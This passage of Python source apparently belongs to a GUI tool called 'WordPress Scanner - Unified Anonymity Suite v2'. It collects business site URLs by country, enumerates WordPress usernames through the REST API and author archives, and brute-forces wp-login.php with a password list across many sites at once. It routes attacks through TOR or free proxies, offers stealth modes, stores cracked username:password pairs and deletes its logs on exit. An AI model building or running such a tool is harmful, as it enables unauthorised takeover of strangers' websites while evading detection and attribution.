        """Check if site is WordPress"""
        try:
            session = self._get_session()
            response = session.get(url, timeout=timeout)
            
            if BS4_AVAILABLE:
                soup = BeautifulSoup(response.text, 'html.parser')
                indicators = [
                    soup.find('meta', {'name': 'generator', 'content': lambda x: x and 'WordPress' in x}),
                    'wp-content' in response.text,
                    'wp-includes' in response.text,
                ]
            else:
                indicators = [
                    'wp-content' in response.text,
                    'wp-includes' in response.text,
                    'WordPress' in response.text,
                ]
            
            return any(indicators)
        except Exception as e:
            audit_logger.debug_event("WP_CHECK", f"WordPress check failed: {type(e).__name__}")
            return False
    
    def verify_wordpress_urls(self, urls: List[str], progress_callback=None) -> List[str]:
        """
        Verify which URLs are WordPress sites using the detector module
        
        Args:
            urls: List of URLs to verify
            progress_callback: Optional callback function(current, total, url, is_wp, reason)
        
        Returns:
            List of verified WordPress URLs
        """
        if not WP_DETECTOR_AVAILABLE:
            self.log("[WARNING] WordPress detector not available - skipping verification")
            return list(urls)
        
        verified = []
        detector = WordPressDetector(timeout=10)
        
        for i, url in enumerate(urls, 1):
            try:
                is_wp, reason = detector.is_wordpress(url)
                
                if progress_callback:
                    progress_callback(i, len(urls), url, is_wp, reason)
                
                if is_wp:
                    verified.append(url)
                    self.log(f"[VERIFY {i}/{len(urls)}] ✓ {url} ({reason})")
                else:
                    self.log(f"[VERIFY {i}/{len(urls)}] ✗ {url}")
                
                time.sleep(0.1)  # Small delay to avoid overwhelming servers
            
            except Exception as e:
                self.log(f"[VERIFY ERROR] {url}: {e}")
        
        self.log(f"[VERIFY COMPLETE] {len(verified)}/{len(urls)} WordPress sites verified ({(len(verified)/len(urls)*100):.1f}%)")
        return verified
    
    def detect_username(self, url: str, timeout: int = 10) -> Optional[str]:
        """Detect WordPress username"""
        try:
            session = self._get_session()
            
            # Try REST API
            try:
                api_url = f"{url.rstrip('/')}/wp-json/wp/v2/users"
                response = session.get(api_url, timeout=timeout)
                if response.status_code == 200:
                    users = response.json()
                    if users and len(users) > 0:
                        return users[0].get('slug') or users[0].get('name')
            except Exception as e:
                audit_logger.debug_event("DETECT_USERNAME", f"REST API check failed: {type(e).__name__}")
            
            # Try author archive
            try:
                author_url = f"{url.rstrip('/')}/?author=1"
                response = session.get(author_url, timeout=timeout, allow_redirects=True)
                if '/author/' in response.url:
                    return response.url.split('/author/')[-1].strip('/')
            except Exception as e:
                audit_logger.debug_event("DETECT_USERNAME", f"Author archive check failed: {type(e).__name__}")
            
            # Parse main page for author links
            if BS4_AVAILABLE:
                try:
                    response = session.get(url, timeout=timeout)
                    soup = BeautifulSoup(response.text, 'html.parser')
                    
                    links = soup.find_all('a', href=lambda x: x and '/author/' in x)
                    for link in links:
                        href = link.get('href', '')
                        if '/author/' in href:
                            username = href.split('/author/')[-1].strip('/')
                            if username and username not in ['', 'feed']:
                                return username
                except Exception as e:
                    audit_logger.debug_event("DETECT_USERNAME", f"Author parsing failed: {type(e).__name__}")
            
            return None
        except Exception as e:
            audit_logger.debug_event("DETECT_USERNAME", f"Username detection failed: {type(e).__name__}")
            return None
    
    def attempt_login(self, url: str, username: str, password: str, timeout: int = 10) -> bool:
        """Attempt WordPress login"""
        try:
            session = self._get_session()
            login_url = f"{url.rstrip('/')}/wp-login.php"
            
            payload = {
                'log': username,
                'pwd': password,
                'wp-submit': 'Log In',
                'redirect_to': f"{url.rstrip('/')}/wp-admin/",
                'testcookie': '1'
            }
            
            response = session.post(login_url, data=payload, 
                                   allow_redirects=True, timeout=timeout)
            
            # More strict login detection - check multiple indicators
            # 1. Check for redirect to wp-admin
            final_url = response.url
            is_wp_admin = '/wp-admin/' in final_url
            
            # 2. Check for logged-in cookie
            has_logged_in_cookie = any('wordpress_logged_in' in str(c.name) or 'wordpress_logged_in' in str(c.value) for c in session.cookies)
            
            # 3. Check response content for logged-in indicators
            content = response.text.lower()
            logged_in_indicators = [
                'dashboard' in content,
                'profile.php' in content,
                'wp-admin' in content and 'login' not in content[:500],  # Not just the login page
                'log out' in content or 'logout' in content,
            ]
            
            # Must have BOTH wp-admin URL AND (cookie OR content indicator)
            success = is_wp_admin and (has_logged_in_cookie or any(logged_in_indicators))
            
            return success
        except (requests.RequestException, Exception) as e:
            audit_logger.debug_event("ATTEMPT_LOGIN", f"Login attempt failed: {type(e).__name__}")
            return False
    
    def scan_site(self, url: str, passwords: List[str], timeout: int = 10) -> dict:
        """Scan a single WordPress site"""
        result = {
            'url': url,
            'username': None,
            'password': None,
            'status': 'error',
            'details': ''
        }
        
        if self._stop:
            return result
        
        # Ensure URL has protocol
        if not url.startswith(('http://', 'https://')):
            url = 'https://' + url
        
        self.log(f"[SCAN] Checking: {url}")
        
        # Check if WordPress
        if not self.is_wordpress(url, timeout):
            result['status'] = 'failed'
            result['details'] = 'Not WordPress'
            return result
        
        # Detect username
        username = self.detect_username(url, timeout)
        if not username:
            result['status'] = 'failed'
            result['details'] = 'Username not found'
            return result
        
        result['username'] = username
        self.log(f"[SCAN] Found username: {username}")
        
        # Try passwords
        for i, password in enumerate(passwords):
            if self._stop:
                break
            
            if self.attempt_login(url, username, password, timeout):
                result['password'] = password
                result['status'] = 'success'
                result['details'] = f'Valid credentials found'
                self.log(f"[SCAN] SUCCESS! {username}:{password}")
                return result
            
            time.sleep(random.uniform(0.1, 0.3))
        
        result['status'] = 'failed'
        result['details'] = 'No valid password found'
        return result
    
    def scan_multiple(self, urls: List[str], passwords: List[str], 
                      threads: int = 3, timeout: int = 10,
                      progress_callback=None):
        """Scan multiple sites"""
        self._stop = False
        self.results = []
        self.stats = {"scanned": 0, "found": 0, "errors": 0}
        
        total = len(urls)
        
        def scan_single(url):
            if self._stop:
                return None
            result = self.scan_site(url, passwords, timeout)
            self.results.append(result)
            
            if result['status'] == 'success':
                self.stats['found'] += 1
            elif result['status'] == 'error':
                self.stats['errors'] += 1
            
            self.stats['scanned'] += 1
            
            if progress_callback:
                progress_callback(self.stats['scanned'], total, self.stats)
            
            return result
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
            list(executor.map(scan_single, urls))
        
        return self.results
    
    def stop(self):
        """Stop scanning"""
        self._stop = True


# ============= CLEANUP MANAGER =============

class CleanupManager:
    """Handles cleanup of sensitive data"""
    
    FILES_TO_CLEAN = [
        "scanner_debug.log",
        "maps_collected_urls.txt",
        "working_proxies.txt",
        "scan_results.csv",
    ]
    
    @staticmethod
    def cleanup_files():
        """Delete sensitive files"""
        for filename in CleanupManager.FILES_TO_CLEAN:
            try:
                if os.path.exists(filename):
                    os.remove(filename)
            except Exception as e:
                audit_logger.debug_event("CLEANUP", f"Failed to delete {filename}: {type(e).__name__}")


# ============= MAIN GUI APPLICATION =============

class UnifiedScannerApp:
    """Main application window"""
    
    def __init__(self, root):
        self.root = root
        self.root.title("WordPress Scanner - Unified Anonymity Suite v2")
        self.root.geometry("1100x800")
        
        # Initialize managers
        self.proxy_manager = ProxyManager(log_callback=self.log)
        self.tor_manager = TORManager(log_callback=self.log)
        self.url_collector = URLCollector(self.log, db_check_func=self.check_url_in_db)
        self.scanner = WordPressScanner(self.proxy_manager, self.tor_manager, self.log)
        
        # Initialize URL database
        if DB_AVAILABLE:
            self.url_db = URLDatabase()
        else:
            self.url_db = None
        
        # Data
        self.collected_urls = set()
        self.scan_results = []
        self.passwords = []
        
        # Quick scan state
        self.quick_scan_running = False
        
        # Create UI
        self.create_ui()
        
        # Setup cleanup
        if AnonymityConfig.AUTO_CLEANUP_ON_EXIT:
            atexit.register(CleanupManager.cleanup_files)
        
        self.log("[APP] WordPress Scanner v2 initialized")
        self.log("[APP] TIP: Use Quick Scan for automated workflow")
        self.log("")
        self.log("[INFO] URL Discovery uses direct connection (your IP visible to Google)")
        self.log("[INFO] WordPress Scanning can use TOR or proxies for anonymity")
    
    def create_ui(self):
        """Create the user interface"""
        # Create notebook for tabs
        self.notebook = ttk.Notebook(self.root)
        self.notebook.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # Create tabs
        self.quick_scan_tab = ttk.Frame(self.notebook)
        self.anonymity_tab = ttk.Frame(self.notebook)
        self.discovery_tab = ttk.Frame(self.notebook)
        self.scanner_tab = ttk.Frame(self.notebook)
        self.results_tab = ttk.Frame(self.notebook)
        self.database_tab = ttk.Frame(self.notebook)
        self.log_tab = ttk.Frame(self.notebook)
        
        self.notebook.add(self.quick_scan_tab, text="Quick Scan")
        self.notebook.add(self.anonymity_tab, text="Anonymity")
        self.notebook.add(self.discovery_tab, text="URL Discovery")
        self.notebook.add(self.scanner_tab, text="Scanner")
        self.notebook.add(self.results_tab, text="Results")
        self.notebook.add(self.database_tab, text="Database")
        self.notebook.add(self.log_tab, text="Logs")
        
        self.create_quick_scan_tab()
        self.create_anonymity_tab()
        self.create_discovery_tab()
        self.create_scanner_tab()
        self.create_results_tab()
        self.create_database_tab()
        self.create_log_tab()
    
    def create_quick_scan_tab(self):
        """Quick Scan - one-click automated workflow"""
        frame = ttk.Frame(self.quick_scan_tab)
        frame.pack(fill=tk.BOTH, expand=True, padx=20, pady=20)
        
        # Title
        title_label = ttk.Label(frame, text="QUICK SCAN", font=('TkDefaultFont', 16, 'bold'))
        title_label.pack(pady=10)
        
        desc_label = ttk.Label(frame, text="Automated: Fetch Proxies → Discover URLs → Scan WordPress Sites")
        desc_label.pack(pady=5)
        
        # Settings frame
        settings_frame = ttk.LabelFrame(frame, text="Quick Scan Settings", padding=15)
        settings_frame.pack(fill=tk.X, pady=20)
        
        # Countries
        row1 = ttk.Frame(settings_frame)
        row1.pack(fill=tk.X, pady=5)
        ttk.Label(row1, text="Countries:").pack(side=tk.LEFT)
        
        self.qs_country_vars = {}
        for country in CITIES.keys():
            var = tk.BooleanVar(value=True)
            self.qs_country_vars[country] = var
            ttk.Checkbutton(row1, text=country, variable=var).pack(side=tk.LEFT, padx=10)
        
        # Max URLs
        row2 = ttk.Frame(settings_frame)
        row2.pack(fill=tk.X, pady=5)
        ttk.Label(row2, text="Max URLs to collect:").pack(side=tk.LEFT)
        self.qs_max_urls_var = tk.IntVar(value=50)
        ttk.Spinbox(row2, from_=10, to=500, textvariable=self.qs_max_urls_var, width=10).pack(side=tk.LEFT, padx=10)
        
        # Password file
        row3 = ttk.Frame(settings_frame)
        row3.pack(fill=tk.X, pady=5)
        ttk.Label(row3, text="Password File:").pack(side=tk.LEFT)
        self.qs_pwd_var = tk.StringVar()
        ttk.Entry(row3, textvariable=self.qs_pwd_var, width=40).pack(side=tk.LEFT, padx=10)
        ttk.Button(row3, text="Browse", command=self.qs_browse_passwords).pack(side=tk.LEFT)
        
        # Use TOR for scanning
        row4 = ttk.Frame(settings_frame)
        row4.pack(fill=tk.X, pady=5)
        self.qs_use_tor_var = tk.BooleanVar(value=False)
        ttk.Checkbutton(row4, text="Use TOR for scanning (requires TOR running)", 
                        variable=self.qs_use_tor_var).pack(side=tk.LEFT)
        
        # Use proxies for scanning
        self.qs_use_proxies_var = tk.BooleanVar(value=True)
        ttk.Checkbutton(row4, text="Use free proxies for scanning", 
                        variable=self.qs_use_proxies_var).pack(side=tk.LEFT, padx=20)
        
        # Stealth mode
        row5 = ttk.Frame(settings_frame)
        row5.pack(fill=tk.X, pady=5)
        ttk.Label(row5, text="Stealth Mode:").pack(side=tk.LEFT)
        self.qs_stealth_var = tk.StringVar(value="cautious")
        ttk.Combobox(row5, textvariable=self.qs_stealth_var,
                     values=["minimal", "cautious", "paranoid"], width=15).pack(side=tk.LEFT, padx=10)
        
        # WordPress verification
        row6 = ttk.Frame(settings_frame)
        row6.pack(fill=tk.X, pady=5)
        self.qs_verify_wp_var = tk.BooleanVar(value=True)
        ttk.Checkbutton(row6, text="Verify only WordPress sites (filters false positives)", 
                        variable=self.qs_verify_wp_var).pack(side=tk.LEFT)
        
        # Big Start Button
        btn_frame = ttk.Frame(frame)
        btn_frame.pack(pady=30)
        
        self.qs_start_btn = ttk.Button(btn_frame, text="START QUICK SCAN", 
                                        command=self.start_quick_scan)
        self.qs_start_btn.pack(side=tk.LEFT, padx=10)
        
        self.qs_stop_btn = ttk.Button(btn_frame, text="STOP", 
                                       command=self.stop_quick_scan, state='disabled')
        self.qs_stop_btn.pack(side=tk.LEFT, padx=10)
        
        # Progress
        progress_frame = ttk.LabelFrame(frame, text="Progress", padding=10)
        progress_frame.pack(fill=tk.X, pady=10)
        
        self.qs_status_var = tk.StringVar(value="Ready")
        ttk.Label(progress_frame, textvariable=self.qs_status_var, font=('TkDefaultFont', 11)).pack(pady=5)
        
        self.qs_progress_var = tk.DoubleVar()
        ttk.Progressbar(progress_frame, variable=self.qs_progress_var, 
                        maximum=100, length=500).pack(pady=5)
        
        # Stats
        stats_frame = ttk.LabelFrame(frame, text="Results", padding=10)
        stats_frame.pack(fill=tk.X, pady=10)
        
        self.qs_stats_var = tk.StringVar(value="URLs: 0 | Scanned: 0 | Found: 0 | Errors: 0")
        ttk.Label(stats_frame, textvariable=self.qs_stats_var, font=('TkDefaultFont', 12)).pack()
    
    def create_anonymity_tab(self):
        """Anonymity configuration tab"""
        frame = ttk.Frame(self.anonymity_tab)
        frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # Important notice
        notice_frame = ttk.LabelFrame(frame, text="Important Notice", padding=10)
        notice_frame.grid(row=0, column=0, sticky='ew', pady=5, padx=5)
        
        notice_text = """Note: URL Discovery (Google Maps scraping) uses your direct IP connection.
TOR/Proxies are used ONLY for WordPress scanning to protect your identity when testing sites.
This is because Google Maps blocks TOR exit nodes."""
        ttk.Label(notice_frame, text=notice_text, wraplength=600, justify='left').pack()
        
        # TOR Section
        tor_frame = ttk.LabelFrame(frame, text="TOR Network (for Scanning)", padding=10)
        tor_frame.grid(row=1, column=0, sticky='ew', pady=5, padx=5)
        
        self.tor_status_var = tk.StringVar(value="Disabled")
        ttk.Label(tor_frame, text="Status:").grid(row=0, column=0, sticky='w')
        self.tor_status_label = ttk.Label(tor_frame, textvariable=self.tor_status_var, 
                                          foreground='red')
        self.tor_status_label.grid(row=0, column=1, sticky='w', padx=5)
        
        self.tor_enable_btn = ttk.Button(tor_frame, text="Enable TOR", 
                                         command=self.toggle_tor)
        self.tor_enable_btn.grid(row=0, column=2, padx=10)
        
        ttk.Button(tor_frame, text="Check IP", command=self.check_ip).grid(row=0, column=3, padx=5)
        
        self.current_ip_var = tk.StringVar(value="Not checked")
        ttk.Label(tor_frame, text="Current IP:").grid(row=1, column=0, sticky='w')
        ttk.Label(tor_frame, textvariable=self.current_ip_var).grid(row=1, column=1, 
                                                                     columnspan=3, sticky='w', padx=5)
        
        # Proxy Section
        proxy_frame = ttk.LabelFrame(frame, text="Free Proxy Management (for Scanning)", padding=10)
        proxy_frame.grid(row=2, column=0, sticky='ew', pady=5, padx=5)
        
        self.proxy_enabled_var = tk.BooleanVar(value=False)
        ttk.Checkbutton(proxy_frame, text="Use Free Proxies for scanning", 
                        variable=self.proxy_enabled_var,
                        command=self.toggle_proxies).grid(row=0, column=0, columnspan=2, sticky='w')
        
        self.proxy_count_var = tk.StringVar(value="0 proxies loaded")
        ttk.Label(proxy_frame, textvariable=self.proxy_count_var).grid(row=1, column=0, 
                                                                        sticky='w', pady=5)
        
        btn_frame = ttk.Frame(proxy_frame)
        btn_frame.grid(row=2, column=0, columnspan=3, pady=5)
        
        self.fetch_proxy_btn = ttk.Button(btn_frame, text="Fetch & Test Proxies", 
                                          command=self.fetch_and_test_proxies)
        self.fetch_proxy_btn.pack(side=tk.LEFT, padx=5)
        
        ttk.Button(btn_frame, text="Save Proxies", 
                   command=self.save_proxies).pack(side=tk.LEFT, padx=5)
        
        ttk.Button(btn_frame, text="Load Proxies", 
                   command=self.load_proxies).pack(side=tk.LEFT, padx=5)
        
        # Progress
        self.proxy_progress_var = tk.DoubleVar()
        self.proxy_progress = ttk.Progressbar(proxy_frame, variable=self.proxy_progress_var, 
                                               maximum=100, length=400)
        self.proxy_progress.grid(row=3, column=0, columnspan=3, sticky='ew', pady=5)
        
        # Stealth Mode
        stealth_frame = ttk.LabelFrame(frame, text="Stealth Settings", padding=10)
        stealth_frame.grid(row=3, column=0, sticky='ew', pady=5, padx=5)
        
        ttk.Label(stealth_frame, text="Stealth Mode:").grid(row=0, column=0, sticky='w')
        self.stealth_mode_var = tk.StringVar(value="cautious")
        stealth_combo = ttk.Combobox(stealth_frame, textvariable=self.stealth_mode_var,
                                      values=["minimal", "cautious", "paranoid"], width=15)
        stealth_combo.grid(row=0, column=1, sticky='w', padx=5)
        stealth_combo.bind('<<ComboboxSelected>>', self.update_stealth_mode)
        
        # Status panel
        status_frame = ttk.LabelFrame(frame, text="Current Anonymity Status", padding=10)
        status_frame.grid(row=4, column=0, sticky='ew', pady=5, padx=5)
        
        self.anonymity_status = tk.Text(status_frame, height=5, width=80, state='disabled')
        self.anonymity_status.pack(fill=tk.X)
        
        self.update_anonymity_status()
    
    def create_discovery_tab(self):
        """URL discovery tab"""
        frame = ttk.Frame(self.discovery_tab)
        frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # Warning
        warn_frame = ttk.Frame(frame)
        warn_frame.grid(row=0, column=0, sticky='ew', pady=5)
        ttk.Label(warn_frame, text="Note: Discovery uses your direct IP (Google blocks TOR/proxies)", 
                  foreground='orange').pack()
        
        # Countries selection
        country_frame = ttk.LabelFrame(frame, text="Target Countries", padding=10)
        country_frame.grid(row=1, column=0, sticky='ew', pady=5)
        
        self.country_vars = {}
        col = 0
        for country in CITIES.keys():
            var = tk.BooleanVar(value=True)
            self.country_vars[country] = var
            ttk.Checkbutton(country_frame, text=country, variable=var).grid(
                row=0, column=col, padx=10)
            col += 1
        
        # Settings
        settings_frame = ttk.LabelFrame(frame, text="Collection Settings", padding=10)
        settings_frame.grid(row=2, column=0, sticky='ew', pady=5)
        
        ttk.Label(settings_frame, text="Max URLs to collect:").grid(row=0, column=0, sticky='w')
        self.max_urls_var = tk.IntVar(value=100)
        ttk.Spinbox(settings_frame, from_=10, to=1000, textvariable=self.max_urls_var,
                    width=10).grid(row=0, column=1, sticky='w', padx=5)
        
        # WordPress verification checkbox
        verify_frame = ttk.LabelFrame(frame, text="WordPress Verification", padding=10)
        verify_frame.grid(row=2, column=0, sticky='ew', pady=5)
        
        self.verify_wp_var = tk.BooleanVar(value=True)
        ttk.Checkbutton(verify_frame, text="Verify only WordPress sites (filters non-WordPress URLs)", 
                        variable=self.verify_wp_var).grid(row=0, column=0, sticky='w', padx=5)
        
        ttk.Label(verify_frame, text="(Verification adds ~10 seconds per URL but eliminates false positives)", 
                  foreground='gray', font=('TkDefaultFont', 9)).grid(row=1, column=0, sticky='w', padx=5)
        
        # Control buttons
        btn_frame = ttk.Frame(frame)
        btn_frame.grid(row=3, column=0, pady=10)
        
        self.discover_btn = ttk.Button(btn_frame, text="Start Discovery", 
                                        command=self.start_discovery)
        self.discover_btn.pack(side=tk.LEFT, padx=5)
        
        self.stop_discover_btn = ttk.Button(btn_frame, text="Stop", 
                                             command=self.stop_discovery, state='disabled')
        self.stop_discover_btn.pack(side=tk.LEFT, padx=5)
        
        ttk.Button(btn_frame, text="Import URLs from File", 
                   command=self.import_urls).pack(side=tk.LEFT, padx=5)
        
        ttk.Button(btn_frame, text="Save URLs", 
                   command=self.save_urls).pack(side=tk.LEFT, padx=5)
        
        ttk.Button(btn_frame, text="Clear URLs", 
                   command=self.clear_urls).pack(side=tk.LEFT, padx=5)
        
        # Progress
        self.discover_progress_var = tk.DoubleVar()
        ttk.Progressbar(frame, variable=self.discover_progress_var, 
                        maximum=100, length=600).grid(row=4, column=0, pady=10, sticky='ew')
        
        self.discover_status_var = tk.StringVar(value="Ready")
        ttk.Label(frame, textvariable=self.discover_status_var).grid(row=5, column=0, sticky='w')
        
        # URL List
        list_frame = ttk.LabelFrame(frame, text="Collected URLs", padding=10)
        list_frame.grid(row=6, column=0, sticky='nsew', pady=5)
        frame.grid_rowconfigure(6, weight=1)
        
        self.url_listbox = tk.Listbox(list_frame, height=12, width=80)
        scrollbar = ttk.Scrollbar(list_frame, orient='vertical', command=self.url_listbox.yview)
        self.url_listbox.configure(yscrollcommand=scrollbar.set)
        
        self.url_listbox.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        
        self.url_count_var = tk.StringVar(value="0 URLs collected")
        ttk.Label(frame, textvariable=self.url_count_var).grid(row=7, column=0, sticky='w')
    
    def create_scanner_tab(self):
        """Scanner configuration tab"""
        frame = ttk.Frame(self.scanner_tab)
        frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # Password file
        pwd_frame = ttk.LabelFrame(frame, text="Password Configuration", padding=10)
        pwd_frame.grid(row=0, column=0, sticky='ew', pady=5)
        
        ttk.Label(pwd_frame, text="Password File:").grid(row=0, column=0, sticky='w')
        self.pwd_file_var = tk.StringVar()
        ttk.Entry(pwd_frame, textvariable=self.pwd_file_var, width=50).grid(row=0, column=1, padx=5)
        ttk.Button(pwd_frame, text="Browse", command=self.browse_passwords).grid(row=0, column=2, padx=5)
        
        ttk.Label(pwd_frame, text="Max passwords:").grid(row=1, column=0, sticky='w', pady=5)
        self.max_pwd_var = tk.IntVar(value=100)
        ttk.Spinbox(pwd_frame, from_=10, to=1000, textvariable=self.max_pwd_var,
                    width=10).grid(row=1, column=1, sticky='w', padx=5)
        
        self.pwd_count_var = tk.StringVar(value="0 passwords loaded")
        ttk.Label(pwd_frame, textvariable=self.pwd_count_var).grid(row=2, column=0, 
                                                                    columnspan=3, sticky='w')
        
        # Scan settings
        scan_frame = ttk.LabelFrame(frame, text="Scan Settings", padding=10)
        scan_frame.grid(row=1, column=0, sticky='ew', pady=5)
        
        ttk.Label(scan_frame, text="Threads:").grid(row=0, column=0, sticky='w')
        self.threads_var = tk.IntVar(value=3)
        ttk.Spinbox(scan_frame, from_=1, to=10, textvariable=self.threads_var,
                    width=10).grid(row=0, column=1, sticky='w', padx=5)
        
        ttk.Label(scan_frame, text="Timeout (sec):").grid(row=0, column=2, sticky='w', padx=20)
        self.timeout_var = tk.IntVar(value=15)
        ttk.Spinbox(scan_frame, from_=5, to=60, textvariable=self.timeout_var,
                    width=10).grid(row=0, column=3, sticky='w', padx=5)
        
        # Control buttons
        btn_frame = ttk.Frame(frame)
        btn_frame.grid(row=2, column=0, pady=10)
        
        self.scan_btn = ttk.Button(btn_frame, text="Start Scan", command=self.start_scan)
        self.scan_btn.pack(side=tk.LEFT, padx=5)
        
        self.stop_scan_btn = ttk.Button(btn_frame, text="Stop Scan", 
                                         command=self.stop_scan, state='disabled')
        self.stop_scan_btn.pack(side=tk.LEFT, padx=5)
        
        ttk.Button(btn_frame, text="Export Results", 
                   command=self.export_results).pack(side=tk.LEFT, padx=5)
        
        # Progress
        self.scan_progress_var = tk.DoubleVar()
        ttk.Progressbar(frame, variable=self.scan_progress_var, 
                        maximum=100, length=600).grid(row=3, column=0, pady=10, sticky='ew')
        
        self.scan_status_var = tk.StringVar(value="Ready")
        ttk.Label(frame, textvariable=self.scan_status_var).grid(row=4, column=0, sticky='w')
        
        # Statistics
        stats_frame = ttk.LabelFrame(frame, text="Statistics", padding=10)
        stats_frame.grid(row=5, column=0, sticky='ew', pady=5)
        
        self.stats_var = tk.StringVar(value="Scanned: 0 | Found: 0 | Errors: 0")
        ttk.Label(stats_frame, textvariable=self.stats_var, font=('TkDefaultFont', 12)).pack()
    
    def create_results_tab(self):
        """Results display tab"""
        frame = ttk.Frame(self.results_tab)
        frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # Treeview
        columns = ("URL", "Username", "Password", "Status", "Details")
        self.results_tree = ttk.Treeview(frame, columns=columns, show="headings", height=20)
        
        for col in columns:
            self.results_tree.heading(col, text=col)
        
        self.results_tree.column("URL", width=250)
        self.results_tree.column("Username", width=120)
        self.results_tree.column("Password", width=120)
        self.results_tree.column("Status", width=80)
        self.results_tree.column("Details", width=200)
        
        vsb = ttk.Scrollbar(frame, orient="vertical", command=self.results_tree.yview)
        hsb = ttk.Scrollbar(frame, orient="horizontal", command=self.results_tree.xview)
        self.results_tree.configure(yscrollcommand=vsb.set, xscrollcommand=hsb.set)
        
        self.results_tree.grid(row=0, column=0, sticky='nsew')
        vsb.grid(row=0, column=1, sticky='ns')
        hsb.grid(row=1, column=0, sticky='ew')
        
        frame.grid_rowconfigure(0, weight=1)
        frame.grid_columnconfigure(0, weight=1)
        
        # Tag configuration
        self.results_tree.tag_configure('success', background='#90EE90')
        self.results_tree.tag_configure('failed', background='#FFB6C6')
        self.results_tree.tag_configure('error', background='#FFE4B5')
        
        # Buttons
        btn_frame = ttk.Frame(frame)
        btn_frame.grid(row=2, column=0, pady=10, sticky='w')
        
        ttk.Button(btn_frame, text="Export All (CSV)", 
                   command=self.export_results).pack(side=tk.LEFT, padx=5)
        ttk.Button(btn_frame, text="Export Success Only", 
                   command=self.export_success_only).pack(side=tk.LEFT, padx=5)
        ttk.Button(btn_frame, text="Clear Results", 
                   command=self.clear_results).pack(side=tk.LEFT, padx=5)
    
    def create_database_tab(self):
        """Database management tab - view and filter stored URLs"""
        frame = self.database_tab
        
        # Title
        title = ttk.Label(frame, text="URL Database", font=('TkDefaultFont', 14, 'bold'))
        title.pack(pady=10)
        
        # Stats frame
        stats_frame = ttk.Frame(frame)
        stats_frame.pack(fill=tk.X, padx=10, pady=5)
        
        self.db_total_var = tk.StringVar(value="Total: 0")
        self.db_verified_var = tk.StringVar(value="WordPress: 0")
        self.db_unverified_var = tk.StringVar(value="Unverified: 0")
        self.db_notwp_var = tk.StringVar(value="Not WP: 0")
        
        ttk.Label(stats_frame, textvariable=self.db_total_var, font=('TkDefaultFont', 11)).pack(side=tk.LEFT, padx=10)
        ttk.Label(stats_frame, textvariable=self.db_verified_var, foreground='green', font=('TkDefaultFont', 11)).pack(side=tk.LEFT, padx=10)
        ttk.Label(stats_frame, textvariable=self.db_unverified_var, foreground='orange', font=('TkDefaultFont', 11)).pack(side=tk.LEFT, padx=10)
        ttk.Label(stats_frame, textvariable=self.db_notwp_var, foreground='red', font=('TkDefaultFont', 11)).pack(side=tk.LEFT, padx=10)
        
        # Filter frame
        filter_frame = ttk.Frame(frame)
        filter_frame.pack(fill=tk.X, padx=10, pady=5)
        
        ttk.Label(filter_frame, text="Filter:").pack(side=tk.LEFT, padx=5)
        
        self.db_filter_var = tk.StringVar(value="all")
        ttk.Radiobutton(filter_frame, text="All", variable=self.db_filter_var, 
                       value="all", command=self.refresh_database_view).pack(side=tk.LEFT, padx=5)
        ttk.Radiobutton(filter_frame, text="Verified (WP)", variable=self.db_filter_var, 
                       value="verified", command=self.refresh_database_view).pack(side=tk.LEFT, padx=5)
        ttk.Radiobutton(filter_frame, text="Unverified Only", variable=self.db_filter_var, 
                       value="unverified", command=self.refresh_database_view).pack(side=tk.LEFT, padx=5)
        ttk.Radiobutton(filter_frame, text="Not WordPress", variable=self.db_filter_var, 
                       value="not_wp", command=self.refresh_database_view).pack(side=tk.LEFT, padx=5)
        
        ttk.Button(filter_frame, text="Refresh", command=self.refresh_database_view).pack(side=tk.LEFT, padx=20)
        ttk.Button(filter_frame, text="Clear Database", command=self.clear_database).pack(side=tk.LEFT, padx=5)
        
        # URL list with Treeview
        list_frame = ttk.Frame(frame)
        list_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)
        
        # Configure treeview
        columns = ('url', 'status', 'verified_date', 'scan_result')
        self.db_tree = ttk.Treeview(list_frame, columns=columns, show='headings')
        
        self.db_tree.heading('url', text='URL')
        self.db_tree.heading('status', text='Status')
        self.db_tree.heading('verified_date', text='Verified')
        self.db_tree.heading('scan_result', text='Scan Result')
        
        self.db_tree.column('url', width=400)
        self.db_tree.column('status', width=100)
        self.db_tree.column('verified_date', width=150)
        self.db_tree.column('scan_result', width=200)
        
        # Scrollbar
        scrollbar = ttk.Scrollbar(list_frame, orient=tk.VERTICAL, command=self.db_tree.yview)
        self.db_tree.configure(yscrollcommand=scrollbar.set)
        
        self.db_tree.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        
        # Configure tags for colors
        self.db_tree.tag_configure('verified', foreground='green')
        self.db_tree.tag_configure('unverified', foreground='orange')
        self.db_tree.tag_configure('not_wp', foreground='red')
        
        # Load initial data
        self.refresh_database_view()
    
    def refresh_database_view(self):
        """Refresh the database URL list"""
        if not self.url_db:
            return
        
        # Clear existing items
        for item in self.db_tree.get_children():
            self.db_tree.delete(item)
        
        # Get filter
        filter_type = self.db_filter_var.get()
        
        # Get URLs from database
        if filter_type == "verified":
            urls = self.url_db.get_all_urls("verified")
        elif filter_type == "unverified":
            urls = self.url_db.get_all_urls("unverified")
        elif filter_type == "not_wp":
            urls = self.url_db.get_all_urls("not_wp")
        else:
            urls = self.url_db.get_all_urls("all")
        
        # Add to treeview
        for url, is_wp, verified_date, scan_result in urls:
            if is_wp == 1:
                status = "✓ WordPress"
                tag = 'verified'
            elif is_wp == 0:
                status = "✗ Not WP"
                tag = 'not_wp'
            else:
                status = "○ Unverified"
                tag = 'unverified'
            
            self.db_tree.insert('', tk.END, values=(url, status, verified_date or '-', scan_result or '-'), tags=(tag,))
        
        # Update stats
        counts = self.url_db.get_url_count()
        self.db_total_var.set(f"Total: {counts['total']}")
        self.db_verified_var.set(f"WordPress: {counts['verified']}")
        self.db_unverified_var.set(f"Unverified: {counts['unverified']}")
        self.db_notwp_var.set(f"Not WP: {counts['not_wp']}")
    
    def clear_database(self):
        """Clear all URLs from database"""
        if messagebox.askyesno("Confirm", "Are you sure you want to delete all URLs from the database?"):
            if self.url_db:
                self.url_db.clear_all()
                self.refresh_database_view()
